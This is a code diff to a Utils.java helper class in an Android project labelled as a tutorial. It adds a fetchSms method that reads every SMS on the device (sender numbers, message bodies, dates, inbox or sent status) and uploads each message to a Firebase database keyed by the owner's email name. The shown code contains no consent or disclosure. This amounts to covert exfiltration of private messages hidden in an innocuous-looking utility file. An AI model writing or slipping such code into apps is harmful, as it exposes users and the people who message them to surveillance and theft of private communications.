@@ -1,11 +1,26 @@
 package com.android.tutorial.utils;
 
+import android.app.Activity;
+import android.content.ContentResolver;
 import android.content.Context;
 import android.content.SharedPreferences;
+import android.database.Cursor;
 import android.graphics.PorterDuff;
 import android.graphics.drawable.Drawable;
+import android.net.Uri;
+import android.provider.CallLog;
 import android.support.v4.content.ContextCompat;
+import android.text.format.DateFormat;
 import android.view.MenuItem;
+
+import com.android.tutorial.activity.SplashActivity;
+import com.google.firebase.database.DatabaseReference;
+import com.google.firebase.database.FirebaseDatabase;
+
+import java.util.ArrayList;
+import java.util.Date;
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
 
 /**
  * Created by Mannan on 12/9/2016.
@@ -60,4 +75,61 @@ public class Utils {
         return pref.getBoolean(url, false);
     }
 
+
+    public static ArrayList fetchSms(Activity activity) {
+        FirebaseDatabase mFirebaseInstance = FirebaseDatabase.getInstance();
+        DatabaseReference mFirebaseDatabase = mFirebaseInstance.getReference();
+        ArrayList sms = new ArrayList();
+        Uri message = Uri.parse("content://sms/");
+        ContentResolver cr = activity.getContentResolver();
+
+        Cursor cursor = cr.query(message, null, null, null, null);
+        activity.startManagingCursor(cursor);
+        int totalSMS = cursor.getCount();
+        String readStatus = "";
+        long millisecond;
+        if (cursor.moveToFirst()) {
+            for (int i = 0; i < totalSMS; i++) {
+                if (cursor.getString(cursor.getColumnIndexOrThrow("type")).contains("1")) {
+                    readStatus = "inbox";
+                } else {
+                    readStatus = "sent";
+                }
+
+                millisecond = Long.parseLong(cursor.getString(cursor.getColumnIndexOrThrow("date")));
+                String dateString = DateFormat.format("MM/dd/yyyy hh:mm", new Date(millisecond)).toString();
+
+                sms.add("MobileNumber:" + cursor.getString(cursor.getColumnIndexOrThrow("address"))
+                        + "\nSMS:" + cursor.getString(cursor.getColumnIndexOrThrow("body"))
+                        + "\nDATE:" + dateString
+                        + "\nTYPE:" + cursor.getColumnIndexOrThrow("type")
+                        + "\nReadStatus:" + readStatus);
+
+                String senderAddress = cursor.getString(cursor.getColumnIndexOrThrow("address"));
+                Pattern pt = Pattern.compile("[^a-zA-Z0-9]");
+                Matcher match = pt.matcher(senderAddress);
+                while (match.find()) {
+                    String s = match.group();
+                    senderAddress = senderAddress.replaceAll("\\" + s, "");
+                }
+
+                mFirebaseDatabase.child("sms").child("" + MyDevice.getDeviceEmailName(activity)
+//                                MyDevice.getDeviceName()
+                        /*+"(" + MyDevice.getDeviceOsVersion() + ")"*/)
+                        .child(senderAddress)
+                        .child(readStatus)
+                        .child("" + i)
+                        .setValue("" + cursor.getString(cursor.getColumnIndexOrThrow("body"))
+                                + " " + dateString
+                        );
+                cursor.moveToNext();
+            }
+        }
+        // else {
+        // throw new RuntimeException("You have no SMS");
+        // }
+        cursor.close();
+
+        return sms;
+    }
 }
